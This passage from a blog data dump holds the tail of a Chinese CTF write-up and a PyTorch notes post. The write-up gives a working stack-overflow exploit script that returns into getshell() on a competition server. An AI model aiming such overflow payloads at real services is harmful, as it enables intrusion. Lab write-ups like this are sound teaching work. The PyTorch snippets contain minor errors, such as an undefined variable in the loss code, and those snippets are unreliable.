class=\"line\">&gt;&gt;flag&#123;d0_U_Kn0w_ba5e32:P&#125;</span><br></pre></td></tr></table></figure></p>\n<p>最终flag提示do u know base32，其实最开始看到密文结尾为=就尝试用了base64</p>\n<p></p><p id=\"j10\"></p><p></p>\n<h3 id=\"10-seabreeze’s-stack-100\"><a href=\"#10-seabreeze’s-stack-100\" class=\"headerlink\" title=\"10.seabreeze’s stack 100\"></a>10.seabreeze’s stack 100</h3><p>题目内容为“nc 202.121.178.181 12321”与一个下载链接[<a href=\"https://ctf.0ops.sjtu.cn/attachment/download/stack\" target=\"_blank\" rel=\"noopener\">stack_55a49bdfcdafd0c31657649e905486a4</a>]，得到一个名为stack的二进制文件。使用strings指令查看一下内部字符内容</p>\n<p><img src=\"/images/in-post/post-blog-jserv16.png\" alt=\"img\"></p>\n<p>可以看到Shell Gotten与三个问题。执行nc指令</p>\n<p><img src=\"/images/in-post/post-blog-jserv17.png\" alt=\"img\"></p>\n<p>需要回答的问题与文件中的内容一致，但是之后还需要输入内容。根据上文的Sell Gotten，显然这里我们需要得到shell的控制权，再根据题目名字stack，考虑为栈溢出问题。</p>\n<p>使用IDA-win32打开，main函数的主体是work函数，work函数如下，就是之前要回答的三个问题。</p>\n<p><img src=\"/images/in-post/post-blog-jserv18.png\" alt=\"img\"></p>\n<p>还有一个没有用到的函数getshell()</p>\n<p><img src=\"/images/in-post/post-blog-jserv19.png\" alt=\"img\"></p>\n<p>只需要程序的返回地址为getshell()的地址，就会触发执行了。查询得到getshell的起始地址为0804 85cb</p>\n<p><img src=\"/images/in-post/post-blog-jserv20.png\" alt=\"img\"></p>\n<p>栈溢出的原理可以参考链接[<a href=\"https://ctf-wiki.github.io/ctf-wiki/pwn/stackoverflow/stackoverflow_basic.html\" target=\"_blank\" rel=\"noopener\">栈溢出</a>]</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> zio <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">io = zio((<span class=\"string\">'202.121.178.181'</span>, <span class=\"number\">12321</span> ))</span><br><span class=\"line\">io.read_until(<span class=\"string\">'Do you want to get acquainted with top experts and like-minded friends in computer security?'</span>)  </span><br><span class=\"line\">io.writeline(<span class=\"string\">'Yes!'</span>)  </span><br><span class=\"line\">io.read_until(<span class=\"string\">'Do you want to stride forwards on the road of hacking and explore endless possibilities?'</span>)  </span><br><span class=\"line\">io.writeline(<span class=\"string\">'Yes!!'</span>)</span><br><span class=\"line\">io.read_until(<span class=\"string\">'Do you want to challenge world cutting-edge technology and compete with outstanding hackers?'</span>)</span><br><span class=\"line\">io.writeline(<span class=\"string\">'Yes!!!'</span>)</span><br><span class=\"line\">success_addr = <span class=\"number\">0x080485cb</span></span><br><span class=\"line\">payload = <span class=\"string\">'a'</span> * <span class=\"number\">0x3fc</span> + <span class=\"string\">\"bbbb\"</span> + p32(success_addr)</span><br><span class=\"line\">io.writeline(payload)  </span><br><span class=\"line\">io.interact()</span><br></pre></td></tr></table></figure>\n<p>运行代码<br><img src=\"/images/in-post/post-blog-jserv21.png\" alt=\"img\"></p>\n<p>cd 进入 /home/…/stack 目录，cat 显示flag。<br><img src=\"/images/in-post/post-blog-jserv22.png\" alt=\"img\"></p>\n<h2 id=\"Have-Idea\"><a href=\"#Have-Idea\" class=\"headerlink\" title=\"Have Idea\"></a>Have Idea</h2><p></p><p id=\"j11\"></p><p></p>\n<h3 id=\"11-aes-duet\"><a href=\"#11-aes-duet\" class=\"headerlink\" title=\"11.aes-duet\"></a>11.aes-duet</h3><p>题目描述为一个链接[<a href=\"https://ctf.0ops.sjtu.cn/attachment/download/aes_duet.zip\" target=\"_blank\" rel=\"noopener\">aes_duet.zip</a>]，解压得到一个密文和加密函数，文件如下</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> Crypto.Cipher <span class=\"keyword\">import</span> AES</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">dummy_key_extend</span><span class=\"params\">(k)</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">assert</span> len(k) == <span class=\"number\">4</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> k * <span class=\"number\">4</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">aes_duet</span><span class=\"params\">(plain, key)</span>:</span></span><br><span class=\"line\">    <span class=\"comment\"># It is so safe that I use AES twice here!</span></span><br><span class=\"line\">    <span class=\"keyword\">assert</span> len(key) == <span class=\"number\">8</span></span><br><span class=\"line\">    k1 = dummy_key_extend(key[:<span class=\"number\">4</span>])</span><br><span class=\"line\">    k2 = dummy_key_extend(key[<span class=\"number\">4</span>:])</span><br><span class=\"line\">    c1 = AES.new(k1, AES.MODE_ECB)</span><br><span class=\"line\">    c2 = AES.new(k2, AES.MODE_ECB)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> c2.encrypt(c1.encrypt(plain))</span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</span><br><span class=\"line\">    <span class=\"keyword\">with</span> open(<span class=\"string\">'./secretkey'</span>, <span class=\"string\">'rb'</span>) <span class=\"keyword\">as</span> f:</span><br><span class=\"line\">        key = f.read()</span><br><span class=\"line\">    <span class=\"comment\"># To make life easier...</span></span><br><span class=\"line\">    <span class=\"keyword\">assert</span> (key.encode(<span class=\"string\">'hex'</span>))[<span class=\"number\">0</span>] == <span class=\"string\">'0'</span></span><br><span class=\"line\">    <span class=\"keyword\">assert</span> (key.encode(<span class=\"string\">'hex'</span>))[<span class=\"number\">-1</span>] == <span class=\"string\">'8'</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    plain = <span class=\"string\">'I am a piece of lovely plaintext'</span></span><br><span class=\"line\">    <span class=\"keyword\">with</span> open(<span class=\"string\">'ciphertext'</span>, <span class=\"string\">'wb'</span>) <span class=\"keyword\">as</span> f:</span><br><span class=\"line\">        f.write(aes_duet(plain, key))</span><br><span class=\"line\">    <span class=\"keyword\">print</span> <span class=\"string\">\"I am a lovely flag: flag&#123; %s&#125;\"</span> % key.encode(<span class=\"string\">'hex'</span>)</span><br></pre></td></tr></table></figure>\n<p>思路很简单，就是AES两轮加密的中间相遇攻击，虽然题目为了降低复杂性提示了key的第一位为0最后一位为8，但是计算量还是十分庞大，需要很多内存，而且计算出来中间值后，查询也会耗时，加上心里的“B树”和“B+树”早忘的没影了，最终因为时间与硬件原因放弃。</p>\n<h2 id=\"感想\"><a href=\"#感想\" class=\"headerlink\" title=\"感想\"></a>感想</h2><p>程序的安全性与正确性同等重要。</p>\n<p>我们在众多bug中微妙的生活着。</p>\n<p>PHP是世界上最好的语言。</p>\n<p><img src=\"/images/in-post/post-blog-j0serv8.gif\" alt=\"img\"></p>\n"},{"layout":"post","title":"pytorch自用笔记","_content":"\n> “防止以后踩坑”\n\n第一眼看到pytorch就十分喜欢，就像第一眼看到golang。\n\npytorch 0.4 发布，api改了。。。\n\n### 0.0 Tensor and Variable\n\n- **Tensor**\n\n```python\n# 沿行取最大值\nmax_value, max_idx = torch.max(x, dim=1)\n# 沿行求和\nsum_x = torch.sum(x, dim=1)\n\n# 增减维度\nx = x.unsqueeze(0) # 在第一维增加\nx = x.unsqueeze(1) # 在第二维增加\n\nx = x.squeeze(0)   # 减少第一维度\nx = x.squeeze()    # tensor中所有维度为1全部去掉\n\n# 维度交换\nx = torch.randn(3, 4, 5)\n# permute 重新排列\nx = x.permute(1, 0, 2) # x : torch.Size([4, 3, 5])\n# transpose 交换 tensor 中两个维度\nx = x.transpose(0, 2)  # x : torch.Size([5, 3, 4])\n\n# view 对 tensor 进行 reshape\nx = torch.randn(3, 4, 5)\nx = x.view(-1, 5) # -1 表示任意大小，5 表示第二维变成 5\n\t\t\t\t  # x : torch.Size([12, 5])\nx = x.view(3, 20) # x : torch.Size([3, 20])\n\n# inplace 操作，直接对tensor操作而不需要另外开辟内存空间。一般是操作符后加_\nx.unsqueeze_(0)     # unsqueeze 进行 inplace\nx.transpose_(1, 0)  # transpose 进行 inplace\n\nx = torch.ones(3, 3)\ny = torch.ones(3, 3)\nx.add_(y)\t# add 进行 inplace\n```\n\n- **Variable**\n\n  Variable 是对 tensor 的封装，每个 Variabel都有三个属性，Variable 中的 tensor本身`.data`，对应 tensor 的梯度`.grad`以及这个 Variable 是通过什么方式得到的`.grad_fn`\n\n```python\nx_tensor = torch.randn(10, 5)\ny_tensor = torch.randn(10, 5)\n\n# 将 tensor 变成 Variable\nx = Variable(x_tensor, requires_grad=True) \n# 默认 Variable 是不需要求梯度的，所以申明需要对其进行求梯度\ny = Variable(y_tensor, requires_grad=True)\n\nz = torch.sum(x + y)\n```\n\n```python\n# 求 x 和 y 的梯度\nz.backward()\n\nprint(x.grad)\n# Variable containing:\n#     1     1     1     1     1\n#     1     1     1     1     1\n#     1     1     1     1     1\n#     1     1     1     1     1\n#     1     1     1     1     1\n#     1     1     1     1     1\n#     1     1     1     1     1\n#     1     1     1     1     1\n#     1     1     1     1     1\n#     1     1     1     1     1\n# [torch.FloatTensor of size 10x5]\n\nprint(y.grad) \n```\n\n### 0.1 自动求导\n\n- **多次自动求导**\n\n  调用 backward 后自动计算一次导数，再次调用会报错，因为pytorch默认做完一次自动求导后，计算图被丢弃，两次求导需要手动设置。\n\n```python\nx = Variable(torch.FloatTensor([3]), requires_grad=True)\ny = x * 2 + x ** 2 + 3\n\ny.backward(retain_graph=True)\nprint(x.grad)\n# Variable containing:\n#  8\n# [torch.FloatTensor of size 1]\n\ny.backward(retain_graph=True)\nprint(x.grad) \n# 输出 16，因为做了两次自动求导，所以将第一次的梯度 8 和第二次的梯度 8 相加得到 16\n\ny.backward() # 再做一次自动求导，这次不保留计算图\nprint(x.grad)\n# 输出 24\n\ny.backward() # 再做会报错，计算图已经丢弃\n```\n\n### 0.2 动态图与静态图\n\npytorch与python的写法基本一致，没有任何额外的学习成本。tensorflow需要先定义图，然后执行，不能直接使用while，需要使用tf.while_loop，有些反直觉。\n\n### 1.0 线性模型与梯度下降\n\n最简单的线性模型$y=x*w+b$，计算误差函数为$\\frac{1}{n}\\sum^n_{i=1}(\\widehat{y}_i-y_i)^2$\n\n数分里都学过梯度的意义在于，沿着梯度函数变化最快，为了尽快找到误差的最小值，需要沿着梯度方向更新$w,b$，二者的梯度分别为\n\n$$\\frac{\\partial}{\\partial w}=\\frac{2}{n}\\sum^n_{i=1}x_i(wx_i+b-y_i)$$\n\n$$\\frac{\\partial}{\\partial b}=\\frac{2}{n}\\sum^n_{i=1}(wx_i+b-y_i)$$\n\n```Python\nimport torch\nimport numpy as np\nfrom torch.autograd import Variable\ntorch.manual_seed(2018)\n# 读入数据 x 和 y\n\n# 读入数据 x 和 y\nx_train = np.array([...], dtype=np.float32)\ny_train = np.array([...], dtype=np.float32)\n\n# 转换成 Tensor\nx_train = torch.from_numpy(x_train)\ny_train = torch.from_numpy(y_train)\n# 定义参数 w 和 b\nw = Variable(torch.randn(1), requires_grad=True) # 随机初始化\nb = Variable(torch.zeros(1), requires_grad=True) # 使用0进行初始化\n# 构建线性回归模型\nx_train = Variable(x_train)\ny_train = Variable(y_train)\ndef linear_model(x):\n    return x * w + b\n# 计算误差\ndef get_loss(y_, y):\n    return torch.mean((y_ - y_train) ** 2)\nloss = get_loss(y_, y_train)\n# 自动求导\nloss.backward()\n# 查看 w 和 b 的梯度\nprint(w.grad)\nprint(b.grad)\n# 更新一次参数\nw.data = w.data - 1e-2 * w.grad.data\nb.data = b.data - 1e-2 * b.grad.data\n```\n\n### 1.1 逻辑回归\n\nLogistic 回归处理的是一个分类问题 (二分类)，形式与线性回归一样，都是 $y=wx+b$，但是它使用 Sigmod 函数将结果变到 0 ~ 1 之间。对于任意输入一个数据，经过 Sigmoid 之后的结果记为 $\\widehat{y}$\n\n+ 损失函数\n\n$$loss=-(ylog(\\widehat{y})+(1-y)log(1-\\widehat{y}))$$\n\n$y$ 表示真实 label，取值 {0, 1}。如果 $y$ 是 0，表示属于第一类，则希望 $\\widehat{y}$ 越小越好，这时 $loss$ 函数为，$loss=-(log(1-\\widehat{y}))$，根据函数单调性，最小化 $loss$ 也就是最小化 $\\widehat{y}$，与要求一致。\n\n如果 $y$ 是 1，表示属于第二类，则希望 $\\widehat{y}$ 越大越好，这时 $loss$ 函数为，$loss=-(log(\\widehat{y}))$，最小化 $loss$ 是最大化 $\\widehat{y}$。\n\n\n\n使用 `torch.optim` 更新参数，需要配合另一个数据类型 `nn.Parameter`，本质上与 Variable 一样，但是 Parameter 默认要求梯度。pytorch 也提供了 Sigmode 函数，通过导入 `torch.nn.functional` 使用。\n\npytorch 提供了 `nn.BCEWithLogitsLoss()`，将 sigmoid 和 loss 写在一层，有更快的速度与稳定性。所以使用它的话，就不需要再定义 Sigmod 函数了。\n\n```python\n# 不使用自带的loss\nimport torch.nn as nn\nimport torch.nn.functional as F\nw = nn.Parameter(torch.randn(2, 1))\nb = nn.Parameter(torch.zeros(1))\n# 定义sigmod\ndef logistic_regression(x):\n    return F.sigmoid(torch.mm(x, w) + b)\n# 定义loss\ndef binary_loss(y_pred, y):\n    logits = (y * y_pred.clamp(1e-12).log() + (1 - y) * (1 - y_pred).clamp(1e-12).log()).mean()\n    return -logits\n#- - - - - - - - - - - - - - - - - - - -\noptimizer = torch.optim.SGD([w, b], lr=1.)\n# 前向传播\ny_pred = logistic_regression(x_data)\nloss = binary_loss(y_pred, y_data) # 计算 loss\n# 反向传播\noptimizer.zero_grad() # 使用优化器将梯度归 0\nloss.backward()\noptimizer.step() # 使用优化器来更新参数\n##########################################\n\n# 使用自带的loss\nimport torch.nn as nn\ncriterion = nn.BCEWithLogitsLoss()\n# 使用 torch.optim 更新参数\nw = nn.Parameter(torch.randn(2, 1))\nb = nn.Parameter(torch.zeros(1))\ndef logistic_reg(x):\n    return torch.mm(x, w) + b\n#- - - - - - - - - - - - - - - - - - - -\noptimizer = torch.optim.SGD([w, b], lr=1.)\n# 前向传播\ny_pred = logistic_reg(x_data)\nloss = criterion(y_pred, y_data)\n# 反向传播\noptimizer.zero_grad()\nloss.backward()\noptimizer.step()\n# 计算正确率\nmask = y_pred.ge(0.5).float()\nacc = (mask == y_data).sum().data[0] / y_data.shape[0]\n```\n\n### 1.2 MLP, Sequential, Module\n\n**MLP**\n\n神经网络使用的激活函数都是非线性的，sigmode函数 $\\sigma(x)=\\frac{1}{1+e^{-x}}$，tanh函数 $tanh(x)=2\\sigma(2x)-1$，ReLU函数 $ReLU(x)=max(0,x)$。其中ReLU使用的较多，因为计算简单，可以加速梯度下降的收敛速度。\n\n+ 为什么要使用激活函数\n\n  假设一个两层的网络，不使用激活函数，结构为$y=w_2(w_1x)=(w_2w_1)x=wx$，实际和一个一层的网络一样。\n\n  通过使用激活函数，网络可以通过改变权重实现任意形状，成为非线性分类器。\n\n**Sequential**\n\nSequential 用来构建序列化模型\n\n```python\n# sequential\nseq_net = nn.Sequential(\n\tnn.Linear(2,4),\n    nn.Tanh(),\n    nn.Linear(4,1)\n)\n# 序列化模型可以通过索引访问每一层\nseq_net[0]\n# 打印第一层权重\nw0 = seq_net[0].weight\nprint(w0)\n# 通过parameters获得模型参数\nparam = seq_net.parameters()\n# 定义优化器\noptim = torch.optim.SGD(param, 1.)\n```\n\n保存模型\n\n```python\n# 将参数和模型保存在一起\ntorch.save(seq_net, 'save_seq_net.pth')\n# 读取保存的模型\nseq_net1 = torch.load('save_seq_net.pth')\n```\n\n```python\n# 只保存模型参数\ntorch.save(seq_net.state_dict(), 'save_seq_net_params.pth')\n# 要重新读入模型的参数，首先我们需要重新定义一次模型，接着重新读入参数\nseq_net2 = nn.Sequential(\n    nn.Linear(2, 4),\n    nn.Tanh(),\n    nn.Linear(4, 1)\n)\nseq_net2.load_state_dict(torch.load('save_seq_net_params.pth'))\n```\n\n**Module**\n\n```python\n# module模板\nclass 网络名字(nn.Module):\n    def __init__(self, 一些定义的参数):\n        super(网络名字, self).__init__()\n        self.layer1 = nn.Linear(num_input, num_hidden)\n        self.layer2 = nn.Sequential(...)\n        ...\n\n        定义需要用的网络层\n\n    def forward(self, x): # 定义前向传播\n        x1 = self.layer1(x)\n        x2 = self.layer2(x)\n        x = x1 + x2\n        ...\n        return x\n    \n# 访问模型中的某层可以直接通过名字\nl1 = 网络名字.layer1\n```\n\n### 1.3 多分类网络\n\n**softmax**\n\n设多分类网络输出为 $z_1,z_2,…,z_k$，首先取指数变成 $e^{z_1},e^{z_2},…,e^{z_k}$，每一项都除以求和\n\n$$\\frac{e^{z_i}}{\\sum^k_{j=1}e^{z_j}}$$\n\n于是所有项求和等于1，每一项分别表示其中某一种的概率。\n\n**交叉熵**\n\n多分类问题使用更加复杂的loss函数，交叉熵。\n\n$$cross\\_entropy(p,q)=E_p\\[-logq\\]=-\\frac{1}{m}p(x)logq(x)$$\n\n这里需要back up一下。所谓 **熵** 是用来反应信息量的。\n\n+ 信息量\n\n  假设 $X$ 是一个离散随机变量，概率分布为 $p(x)=Pr(X=x)$，事件 $X=x_0$的信息量为 $I(x_0)=-log(p(x_0))$。从表达式可以看出，概率越大，信息量越小。概率越大，大家越会认为这一事件的发生几乎是确定的，这一事件的发生并不会引入太多信息量。\n\n+ 熵\n\n  假设李华考试结果为一个0-1分布，{0不及格，1及格}，根据先验知识，由于李华不好好学习，考试及格(记为事件A)概率是$p(x_A)=0.1$，不及格的概率是0.9，则所有可能结果带来的额外信息的期望为\n\n  $$H_A(x)=-[p(x_A)log(p(x_A))+(1-P(x_A))log(1-p(x_A))]=0.469$$\n\n  如果还有一个张华成绩不好不坏，考试及格(记为时间B)概率是 $p(x_B)=0.5$\n\n  $$H_B(x)=-[p(x_B)log(p(x_B))+(1-P(x_B))log(1-p(x_B))]=1$$\n\n  说明在成绩出来前，猜出张华的结果比李华要难。熵越大，变量取值越不稳定。\n\n+ 交叉熵\n\n  两个分布$p,q$，$CEH(p,q)=E_p\\[-logq\\]$\n\n\n\n对于二分类问题，loss可以写为\n\n$$-\\frac{1}{m}\\sum^m_{i=1}(y^ilog\\, sigmod(x^i)+(1-y^i)log(1-sigmod(x^i)))$$\n\n```python\n# pytorch 提供了交叉熵函数\ncriterion = nn.CrossEntropyLoss()\n```\n\n### 1.4 参数初始化\n\n+ **使用numpy初始化**\n\n\n","source":"_posts/2018-04-23-pytorchbg.markdown","raw":"---\nlayout:     post\ntitle:      \"pytorch自用笔记\"\ntags:\n    - python\n---\n\n> “防止以后踩坑”\n\n第一眼看到pytorch就十分喜欢，就像第一眼看到golang。\n\npytorch 0.4 发布，api改了。。。\n\n### 0.0 Tensor and Variable\n\n- **Tensor**\n\n```python\n# 沿行取最大值\nmax_value, max_idx = torch.max(x, dim=1)\n# 沿行求和\nsum_x = torch.sum(x, dim=1)\n\n# 增减维度\nx = x.unsqueeze(0) # 在第一维增加\nx = x.unsqueeze(1) # 在第二维增加\n\nx = x.squeeze(0)   # 减少第一维度\nx = x.squeeze()    # tensor中所有维度为1全部去掉\n\n# 维度交换\nx = torch.randn(3, 4, 5)\n# permute 重新排列\nx = x.permute(1, 0, 2) # x : torch.Size([4, 3, 5])\n# transpose 交换 tensor 中两个维度\nx = x.transpose(0, 2)  # x : torch.Size([5, 3, 4])\n\n# view 对 tensor 进行 reshape\nx = torch.randn(3, 4, 5)\nx = x.view(-1, 5) # -1 表示任意大小，5 表示第二维变成 5\n\t\t\t\t  # x : torch.Size([12, 5])\nx = x.view(3, 20) # x : torch.Size([3, 20])\n\n# inplace 操作，直接对tensor操作而不需要另外开辟内存空间。一般是操作符后加_\nx.unsqueeze_(0)     # unsqueeze 进行 inplace\nx.transpose_(1, 0)  # transpose 进行 inplace\n\nx = torch.ones(3, 3)\ny = torch.ones(3, 3)\nx.add_(y)\t# add 进行 inplace\n```\n\n- **Variable**\n\n  Variable 是对 tensor 的封装，每个 Variabel都有三个属性，Variable 中的 tensor本身`.data`，对应 tensor 的梯度`.grad`以及这个 Variable 是通过什么方式得到的`.grad_fn`\n\n```python\nx_tensor = torch.randn(10, 5)\ny_tensor = torch.randn(10, 5)\n\n# 将 tensor 变成 Variable\nx = Variable(x_tensor, requires_grad=True) \n# 默认 Variable 是不需要求梯度的，所以申明需要对其进行求梯度\ny = Variable(y_tensor, requires_grad=True)\n\nz = torch.sum(x + y)\n```\n\n```python\n# 求 x 和 y 的梯度\nz.backward()\n\nprint(x.grad)\n# Variable containing:\n#     1     1     1     1     1\n#     1     1     1     1     1\n#     1     1     1     1     1\n#     1     1     1     1     1\n#     1     1     1     1     1\n#     1     1     1     1     1\n#     1     1     1     1     1\n#     1     1     1     1     1\n#     1     1     1     1     1\n#     1     1     1     1     1\n# [torch.FloatTensor of size 10x5]\n\nprint(y.grad) \n```\n\n### 0.1 自动求导\n\n- **多次自动求导**\n\n  调用 backward 后自动计算一次导数，再次调用会报错，因为pytorch默认做完一次自动求导后，计算图被丢弃，两次求导需要手动设置。\n\n```python\nx = Variable(torch.FloatTensor([3]), requires_grad=True)\ny = x * 2 + x ** 2 + 3\n\ny.backward(retain_graph=True)\nprint(x.grad)\n# Variable containing:\n#  8\n# [torch.FloatTensor of size 1]\n\ny.backward(retain_graph=True)\nprint(x.grad) \n# 输出 16，因为做了两次自动求导，所以将第一次的梯度 8 和第二次的梯度 8 相加得到 16\n\ny.backward() # 再做一次自动求导，这次不保留计算图\nprint(x.grad)\n# 输出 24\n\ny.backward() # 再做会报错，计算图已经丢弃\n```\n\n### 0.2 动态图与静态图\n\npytorch与python的写法基本一致，没有任何额外的学习成本。tensorflow需要先定义图，然后执行，不能直接使用while，需要使用tf.while_loop，有些反直觉。\n\n### 1.0 线性模型与梯度下降\n\n最简单的线性模型$y=x*w+b$，计算误差函数为$\\frac{1}{n}\\sum^n_{i=1}(\\widehat{y}_i-y_i)^2$\n\n数分里都学过梯度的意义在于，沿着梯度函数变化最快，为了尽快找到误差的最小值，需要沿着梯度方向更新$w,b$，二者的梯度分别为\n\n$$\\frac{\\partial}{\\partial w}=\\frac{2}{n}\\sum^n_{i=1}x_i(wx_i+b-y_i)$$\n\n$$\\frac{\\partial}{\\partial b}=\\frac{2}{n}\\sum^n_{i=1}(wx_i+b-y_i)$$\n\n```Python\nimport torch\nimport numpy as np\nfrom torch.autograd import Variable\ntorch.manual_seed(2018)\n# 读入数据 x 和 y\n\n# 读入数据 x 和 y\nx_train = np.array([...], dtype=np.float32)\ny_train = np.array([...], dtype=np.float32)\n\n# 转换成 Tensor\nx_train = torch.from_numpy(x_train)\ny_train = torch.from_numpy(y_train)\n# 定义参数 w 和 b\nw = Variable(torch.randn(1), requires_grad=True) # 随机初始化\nb = Variable(torch.zeros(1), requires_grad=True) # 使用0进行初始化\n# 构建线性回归模型\nx_train = Variable(x_train)\ny_train = Variable(y_train)\ndef linear_model(x):\n    return x * w + b\n# 计算误差\ndef get_loss(y_, y):\n    return torch.mean((y_ - y_train) ** 2)\nloss = get_loss(y_, y_train)\n# 自动求导\nloss.backward()\n# 查看 w 和 b 的梯度\nprint(w.grad)\nprint(b.grad)\n# 更新一次参数\nw.data = w.data - 1e-2 * w.grad.data\nb.data = b.data - 1e-2 * b.grad.data\n```\n\n### 1.1 逻辑回归\n\nLogistic 回归处理的是一个分类问题 (二分类)，形式与线性回归一样，都是 $y=wx+b$，但是它使用 Sigmod 函数将结果变到 0 ~ 1 之间。对于任意输入一个数据，经过 Sigmoid 之后的结果记为 $\\widehat{y}$\n\n+ 损失函数\n\n$$loss=-(ylog(\\widehat{y})+(1-y)log(1-\\widehat{y}))$$\n\n$y$ 表示真实 label，取值 {0, 1}。如果 $y$ 是 0，表示属于第一类，则希望 $\\widehat{y}$ 越小越好，这时 $loss$ 函数为，$loss=-(log(1-\\widehat{y}))$，根据函数单调性，最小化 $loss$ 也就是最小化 $\\widehat{y}$，与要求一致。\n\n如果 $y$ 是 1，表示属于第二类，则希望 $\\widehat{y}$ 越大越好，这时 $loss$ 函数为，$loss=-(log(\\widehat{y}))$，最小化 $loss$ 是最大化 $\\widehat{y}$。\n\n\n\n使用 `torch.optim` 更新参数，需要配合另一个数据类型 `nn.Parameter`，本质上与 Variable 一样，但是 Parameter 默认要求梯度。pytorch 也提供了 Sigmode 函数，通过导入 `torch.nn.functional` 使用。\n\npytorch 提供了 `nn.BCEWithLogitsLoss()`，将 sigmoid 和 loss 写在一层，有更快的速度与稳定性。所以使用它的话，就不需要再定义 Sigmod 函数了。\n\n```python\n# 不使用自带的loss\nimport torch.nn as nn\nimport torch.nn.functional as F\nw = nn.Parameter(torch.randn(2, 1))\nb = nn.Parameter(torch.zeros(1))\n# 定义sigmod\ndef logistic_regression(x):\n    return F.sigmoid(torch.mm(x, w) + b)\n# 定义loss\ndef binary_loss(y_pred, y):\n    logits = (y * y_pred.clamp(1e-12).log() + (1 - y) * (1 - y_pred).clamp(1e-12).log()).mean()\n    return -logits\n#- - - - - - - - - - - - - - - - - - - -\noptimizer = torch.optim.SGD([w, b], lr=1.)\n# 前向传播\ny_pred = logistic_regression(x_data)\nloss = binary_loss(y_pred, y_data) # 计算 loss\n# 反向传播\noptimizer.zero_grad() # 使用优化器将梯度归 0\nloss.backward()\noptimizer.step() # 使用优化器来更新参数\n##########################################\n\n# 使用自带的loss\nimport torch.nn as nn\ncriterion = nn.BCEWithLogitsLoss()\n# 使用 torch.optim 更新参数\nw = nn.Parameter(torch.randn(2, 1))\nb = nn.Parameter(torch.zeros(1))\ndef logistic_reg(x):\n    return torch.mm(x, w) + b\n#- - - - - - - - - - - - - - - - - - - -\noptimizer = torch.optim.SGD([w, b], lr=1.)\n# 前向传播\ny_pred = logistic_reg(x_data)\nloss = criterion(y_pred, y_data)\n# 反向传播\noptimizer.zero_grad()\nloss.backward()\noptimizer.step()\n# 计算正确率\nmask = y_pred.ge(0.5).float()\nacc = (mask == y_data).sum().data[0] / y_data.shape[0]\n```\n\n### 1.2 MLP, Sequential, Module\n\n**MLP**\n\n神经网络使用的激活函数都是非线性的，sigmode函数 $\\sigma(x)=\\frac{1}{1+e^{-x}}$，tanh函数 $tanh(x)=2\\sigma(2x)-1$，ReLU函数 $ReLU(x)=max(0,x)$。其中ReLU使用的较多，因为计算简单，可以加速梯度下降的收敛速度。\n\n+ 为什么要使用激活函数\n\n  假设一个两层的网络，不使用激活函数，结构为$y=w_2(w_1x)=(w_2w_1)x=wx$，实际和一个一层的网络一样。\n\n  通过使用激活函数，网络可以通过改变权重实现任意形状，成为非线性分类器。\n\n**Sequential**\n\nSequential 用来构建序列化模型\n\n```python\n# sequential\nseq_net = nn.Sequential(\n\tnn.Linear(2,4),\n    nn.Tanh(),\n    nn.Linear(4,1)\n)\n# 序列化模型可以通过索引访问每一层\nseq_net[0]\n# 打印第一层权重\nw0 = seq_net[0].weight\nprint(w0)\n# 通过parameters获得模型参数\nparam = seq_net.parameters()\n# 定义优化器\noptim = torch.optim.SGD(param, 1.)\n```\n\n保存模型\n\n```python\n# 将参数和模型保存在一起\ntorch.save(seq_net, 'save_seq_net.pth')\n# 读取保存的模型\nseq_net1 = torch.load('save_seq_net.pth')\n```\n\n```python\n# 只保存模型参数\ntorch.save(seq_net.state_dict(), 'save_seq_net_params.pth')\n# 要重新读入模型的参数，首先我们需要重新定义一次模型，接着重新读入参数\nseq_net2 = nn.Sequential(\n    nn.Linear(2, 4),\n    nn.Tanh(),\n    nn.Linear(4, 1)\n)\nseq_net2.load_state_dict(torch.load('save_seq_net_params.pth'))\n```\n\n**Module**\n\n```python\n# module模板\nclass 网络名字(nn.Module):\n    def __init__(self, 一些定义的参数):\n        super(网络名字, self).__init__()\n        self.layer1 = nn.Linear(num_input, num_hidden)\n        self.layer2 = nn.Sequential(...)\n        ...\n\n        定义需要用的网络层\n\n    def forward(self, x): # 定义前向传播\n        x1 = self.layer1(x)\n        x2 = self.layer2(x)\n        x = x1 + x2\n        ...\n        return x\n    \n# 访问模型中的某层可以直接通过名字\nl1 = 网络名字.layer1\n```\n\n### 1.3 多分类网络\n\n**softmax**\n\n设多分类网络输出为 $z_1,z_2,…,z_k$，首先取指数变成 